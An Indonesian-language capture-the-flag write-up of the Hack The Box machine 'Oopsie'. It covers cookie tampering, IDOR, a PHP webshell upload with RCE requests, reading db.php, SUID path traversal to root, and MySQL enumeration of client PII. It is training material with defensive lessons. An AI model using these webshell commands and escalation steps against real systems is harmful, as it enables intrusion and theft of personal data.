# Oopsie — Broken Access Control & SUID Privilege Escalation

**Date:** 2026-04-30
**Platform:** Hack The Box — Starting Point
**Difficulty:** Very Easy
**Category:** Web / Linux / Privilege Escalation

---

## Target

MegaCorp Automotive — sebuah web aplikasi berbasis PHP yang berjalan di atas Apache 2.4.29 pada Ubuntu 18.04. Machine ini memiliki panel admin dengan fitur upload file, serta binary SUID yang dapat dieksploitasi untuk privilege escalation ke root.

## Vulnerability

1. **Broken Access Control via Cookie Manipulation** — server mempercayai nilai cookie `role` dan `user` tanpa validasi server-side, sehingga siapapun bisa mengubah role menjadi admin.
2. **IDOR (Insecure Direct Object Reference)** — parameter `id` di URL tidak divalidasi, memungkinkan enumerasi data user lain termasuk admin.
3. **Unrestricted File Upload → RCE** — halaman upload tidak memfilter ekstensi file, sehingga PHP webshell bisa diupload dan dieksekusi.
4. **SUID Binary Exploitation + Path Traversal** — binary `/usr/bin/bugtracker` berjalan sebagai root (SUID), namun menerima input yang tidak disanitasi sehingga bisa digunakan untuk membaca file milik root.

## Tools Used

- Nmap
- Firefox DevTools (F12)
- Burp Suite
- Gobuster
- SSH

---

## Exploitation Steps

### Step 1 — Reconnaissance

Scan port dan service menggunakan Nmap untuk mengetahui attack surface target.

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

**Hasil:**
- Port 22 → SSH (OpenSSH 7.6p1 Ubuntu)
- Port 80 → HTTP (Apache 2.4.29 Ubuntu)
- OS terdeteksi: Linux Ubuntu

---

### Step 2 — Web Enumeration

Buka `http://<TARGET_IP>` di browser — tampil halaman MegaCorp Automotive. Tidak ada form login di halaman utama. Gunakan Burp Suite untuk memonitor traffic saat browsing, dan temukan path `/cdn-cgi/login/` di tab Target.

Jalankan Gobuster untuk menemukan direktori tersembunyi:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

**Direktori penting yang ditemukan:**
- `/cdn-cgi/login/` — halaman login
- `/uploads/` — tempat file yang diupload tersimpan

---

### Step 3 — Cookie Manipulation & IDOR

Buka halaman login di `http://<TARGET_IP>/cdn-cgi/login/` dan klik **Login as Guest**. Aktifkan Burp Suite Proxy Intercept, lalu perhatikan cookie yang dikirim:

```
Cookie: user=2233; role=guest
```

**IDOR:** Halaman account menggunakan parameter `?id=` di URL. Ubah nilai `id` dari `2` menjadi `1` untuk melihat data admin:

```
http://<TARGET_IP>/cdn-cgi/login/admin.php?content=accounts&id=1
```

Hasil: Access ID admin = `34322`, email = `admin@megacorp.com`

**Cookie Manipulation:** Ubah cookie melalui Firefox DevTools (F12 → Storage → Cookies):

```
role: guest  →  admin
user: 2233   →  34322
```

Setelah refresh, halaman **Uploads** kini bisa diakses.

---

### Step 4 — File Upload & Remote Code Execution

Buat file PHP webshell di Kali Linux menggunakan `echo` ke file baru, lalu simpan di `/tmp/`. Webshell berisi satu baris kode PHP yang menerima parameter `cmd` dari URL dan mengeksekusinya sebagai command sistem.

Upload file tersebut melalui halaman Branding Image Uploads. File tersimpan di direktori `/uploads/`. Verifikasi eksekusi:

```
http://<TARGET_IP>/uploads/pwn.php?cmd=whoami
```

Output: `www-data` — RCE berhasil!

**Catatan penting:**
- Spasi di URL diganti dengan `+`
- Webshell bersifat stateless, tidak bisa `cd` antar request
- Gunakan `ls+/path/folder` untuk navigasi

---

### Step 5 — Menemukan Kredensial

Eksplorasi struktur folder web server via webshell:

```
?cmd=ls+/var/www/html
?cmd=ls+/var/www/html/cdn-cgi/login
```

Ditemukan file `db.php`. Karena `cat` tidak bisa menampilkan konten file PHP (dieksekusi server), gunakan `od`:

```
?cmd=od+-c+/var/www/html/cdn-cgi/login/db.php
```

Dari output ditemukan kredensial:
- **Username:** `robert`
- **Password:** (kredensial database aplikasi)
- **Database:** `garage`

---

### Step 6 — SSH Login & User Flag

Login via SSH menggunakan kredensial yang ditemukan:

```bash
ssh robert@<TARGET_IP>
```

Setelah berhasil masuk, ambil user flag:

```bash
cat user.txt
```

---

### Step 7 — Privilege Escalation via SUID Binary

Cari file yang dimiliki group `bugtracker`:

```bash
find / -group bugtracker 2>/dev/null
```

Ditemukan: `/usr/bin/bugtracker`

Cek permission:

```bash
ls -la /usr/bin/bugtracker
```

Output: `-rwsr-xr--` — huruf `s` menunjukkan **SUID aktif**, artinya binary ini selalu berjalan sebagai root.

Jalankan binary dan masukkan ID yang tidak ada untuk melihat error:

```bash
/usr/bin/bugtracker
# Input: 99
# Error: cat: /root/reports/99: No such file or directory
```

Binary ini memanggil `cat /root/reports/[INPUT]` tanpa sanitasi. Gunakan **Path Traversal** untuk membaca file root:

```bash
/usr/bin/bugtracker
# Input: ../root.txt
```

Root flag berhasil didapat dari `/root/root.txt`.

---

## Proof

```
User Flag: [ada di /home/robert/user.txt]
Root Flag: [ada di /root/root.txt]
```

---

## Lessons Learned

**Hal baru yang dipelajari:**
- Cookie bisa dimanipulasi langsung dari browser (F12 Storage) maupun Burp Suite Proxy — server tidak boleh mempercayai nilai cookie tanpa validasi
- IDOR bisa ditemukan cukup dengan mengubah angka parameter di URL
- Webshell PHP stateless — navigasi folder harus langsung di parameter, bukan pakai `cd`
- File PHP tidak bisa dibaca dengan `cat` via webshell karena dieksekusi server — gunakan `od -c` atau `strings`
- SUID binary yang memanggil command eksternal tanpa sanitasi input bisa dieksploitasi untuk privilege escalation
- Error message program bisa bocorkan informasi path internal sistem

**Kesalahan yang dibuat:**
- Menggunakan Repeater di Burp Suite untuk modifikasi cookie — Repeater hanya simulasi, tidak mengubah cookie di browser. Harus pakai Proxy Intercept atau F12 Storage
- Lupa menambahkan trailing slash pada path URL (`/cdn-cgi/login` vs `/cdn-cgi/login/`)
- Menggunakan `cat` untuk baca file PHP via webshell — harus pakai `od -c`

**Yang ingin dieksplore lebih lanjut:**
- Upgrade webshell ke reverse shell yang stabil (netcat/bash reverse shell)
- Teknik enumerasi privilege escalation yang lebih sistematis (LinPEAS, sudo -l, cron jobs)
- Cara sanitasi input yang benar untuk mencegah Path Traversal

# Oopsie — Database Exploration & Post Exploitation

**Date:** 2026-04-30
**Platform:** Hack The Box — Starting Point
**Difficulty:** Very Easy
**Category:** Web / Database / Post Exploitation

---

## Target

MegaCorp Automotive — setelah berhasil masuk sebagai user `robert` via SSH, ditemukan kredensial database MySQL di file konfigurasi aplikasi web. Eksplorasi database dilakukan sebagai bagian dari post exploitation untuk memaksimalkan data yang bisa diakses.

## Vulnerability

1. **Credential Exposure in Config File** — kredensial database tersimpan dalam plaintext di file konfigurasi PHP yang dapat dibaca via webshell.
2. **Excessive Database Privileges** — user `robert` memiliki akses penuh ke database aplikasi, memungkinkan pembacaan seluruh data.
3. **Sensitive Data Exposure (Critical)** — database menyimpan PII (nama & email) klien bisnis, data akun internal, dan informasi harga kendaraan tanpa enkripsi.

## Tools Used

- SSH
- MySQL Client
- Webshell (PHP)

---

## Exploitation Steps

### Step 1 — Menemukan Kredensial Database

Setelah mendapatkan akses webshell, eksplorasi struktur folder web server dilakukan untuk menemukan file konfigurasi. File `db.php` ditemukan di dalam folder aplikasi login.

Karena `cat` tidak bisa menampilkan konten file PHP via webshell (file dieksekusi bukan ditampilkan), digunakan perintah `od` untuk membaca raw content:

```
?cmd=od+-c+/var/www/html/cdn-cgi/login/db.php
```

Dari output ditemukan:
- **Username:** `robert`
- **Password:** (tersimpan plaintext di config file)
- **Database:** `garage`
- **Host:** `localhost`

---

### Step 2 — Koneksi ke Database

Setelah login via SSH sebagai `robert`, koneksi ke MySQL menggunakan kredensial yang ditemukan:

```bash
mysql -u robert -p'[PASSWORD]' garage
```

**Penjelasan switch:**

| Switch | Fungsi |
|--------|--------|
| `-u` | username database |
| `-p` | password (langsung nempel tanpa spasi) |
| `-h` | host target (default: localhost) |
| `-P` | port (default: 3306) |
| `garage` | nama database yang langsung dibuka |

> ⚠️ Warning "insecure" muncul karena password terlihat di command line. Di real pentest gunakan `-p` saja lalu input password secara manual.

---

### Step 3 — Enumerasi Database

Lihat semua tabel yang ada di database `garage`:

```sql
SHOW TABLES;
```

**Hasil:**
```
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
```

---

### Step 4 — Eksplorasi Tabel accounts

Lihat struktur tabel terlebih dahulu:

```sql
DESCRIBE accounts;
```

**Struktur:**
```
id     | int(11)      
access | int(11)      
name   | varchar(100) 
email  | varchar(100) 
```

Ambil semua data:

```sql
SELECT * FROM accounts;
```

**Data yang ditemukan:** 6 akun internal termasuk super admin, lengkap dengan Access ID dan email korporat.

---

### Step 5 — Eksplorasi Tabel clients

```sql
DESCRIBE clients;
SELECT * FROM clients;
```

**Data yang ditemukan:** 4 data klien bisnis lengkap dengan nama perusahaan dan email — ini adalah **PII (Personally Identifiable Information)** yang seharusnya dilindungi.

---

### Step 6 — Eksplorasi Tabel branding

```sql
DESCRIBE branding;
SELECT * FROM branding;
```

**Data yang ditemukan:** Model dan harga kendaraan internal — informasi bisnis sensitif yang seharusnya tidak dapat diakses publik.

---

## Proof

```
Data sensitif berhasil diakses:
- 6 akun internal sistem (termasuk super admin)
- 4 data klien bisnis + email (PII)
- Data harga internal kendaraan
```

---

## Severity Assessment

| Temuan | Severity | Alasan |
|--------|----------|--------|
| Kredensial DB di config file | High | Plaintext credential exposure |
| Akses penuh ke database | Critical | Seluruh data bisa dibaca/diubah |
| Bocornya data PII klien | Critical | Pelanggaran privasi, potensi denda GDPR |
| Bocornya data akun internal | Critical | Dapat digunakan untuk serangan lanjutan |
| Bocornya harga internal | High | Data bisnis sensitif kompetitor bisa manfaatkan |

**Bug Bounty Priority:**
```
Credential in config file  → P2 (High)
Database dump + PII        → P1 (Critical) 🔴
Full DB access             → P1 (Critical) 🔴
```

---

## SQL Commands Cheatsheet

```sql
SHOW DATABASES;              -- lihat semua database
SHOW TABLES;                 -- lihat semua tabel di database aktif
DESCRIBE nama_tabel;         -- lihat struktur/kolom tabel
SELECT * FROM nama_tabel;    -- tampilkan semua data tabel
SELECT kolom FROM tabel;     -- tampilkan kolom tertentu saja
WHERE kolom = 'nilai';       -- filter data
EXIT;                        -- keluar dari MySQL
```

---

## Lessons Learned

**Hal baru yang dipelajari:**
- Kredensial database yang tersimpan plaintext di config file adalah temuan High/Critical tersendiri — terpisah dari vulnerability upload/RCE
- `od -c` bisa digunakan untuk membaca raw content file PHP yang tidak bisa dibaca dengan `cat` via webshell
- Dalam real pentest, post exploitation database wajib dilakukan untuk memaksimalkan scope temuan dan bukti dampak nyata
- Data PII yang bocor otomatis masuk Critical karena implikasi hukum (GDPR, UU PDP)
- Perbedaan CTF vs Real Pentest: di CTF cukup dapat flag, di real pentest harus dokumentasi semua data yang bisa diakses sebagai bukti dampak

**Kesalahan yang dibuat:**
- Awalnya mencoba akses database via webshell — lebih efisien langsung dari SSH setelah dapat kredensial
- Lupa bahwa `cat` tidak bisa baca file PHP via webshell karena PHP dieksekusi server

**Yang ingin dieksplore lebih lanjut:**
- Teknik SQL Injection untuk akses database tanpa kredensial
- Cara dump seluruh database ke file lokal (`mysqldump`)
- Cracking password hash jika database menyimpan hash password
- Pivoting ke sistem lain menggunakan data yang ditemukan di database